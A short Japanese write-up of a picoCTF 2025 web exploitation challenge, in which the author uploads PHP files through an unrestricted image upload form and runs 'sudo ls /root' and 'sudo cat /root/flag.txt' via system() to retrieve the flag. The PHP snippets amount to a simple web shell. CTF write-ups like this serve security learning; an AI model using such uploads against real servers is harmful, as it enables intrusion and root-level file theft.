#easy #Web_Exploitation #picoCTF_2025 #browser_webshell_solvable

# Overview
![[Pasted image 20250528142915.png]]
flagは/rootにあるようです。やってみましょう

# Server Detail
画像をアップロードできて画像を保存してくれるみたい。
![[Screenshot 2025-05-28 at 14.49.32.png]]
`/upload.php`ってあるからPHPで動いているようです。
![[Screenshot 2025-05-28 at 14.50.29.png]]

![[Screenshot 2025-05-28 at 14.50.57.png]]
それと何でもアップロードできちゃう、mp3とかも.phpファイルとかもアップロードしたらサーバー側で実行してくれそう。

# How to Capture the flag

コマンドを実行するphpファイルを作成してアップロード&開く
作成したphpファイル
```php
<?php
system("ls /root");
?>
```
実行されたっぽいけどEmptyが返ってきました。

root権限の不足っぽい? sudo付きで試してみます
```php
<?php
system("sudo ls /root");
?>
```
![[Screenshot 2025-05-28 at 14.55.13.png]]
`/root`の中身が帰ってきました!!
ではこのまま`/root/flag.txt`を見てみましょう 👀
```php
<?php
system("sudo cat /root/flag.txt");
?>
```
Gotcha!
![[Screenshot 2025-05-28 at 14.57.08.png]]
フラグを掴むことができました🚩